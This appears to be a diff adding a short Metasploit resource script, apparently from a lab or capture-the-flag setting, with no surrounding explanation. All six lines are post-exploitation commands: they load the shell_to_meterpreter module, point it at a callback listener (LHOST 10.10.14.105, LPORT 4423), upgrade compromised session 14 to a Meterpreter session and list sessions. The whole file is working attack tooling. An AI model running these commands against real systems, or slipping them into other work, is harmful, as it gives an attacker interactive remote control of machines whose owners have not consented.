@@ -1,0 +1,6 @@
+use post/multi/manage/shell_to_meterpreter
+setg LHOST 10.10.14.105
+set LPORT 4423
+set SESSION 14
+run
+sessions
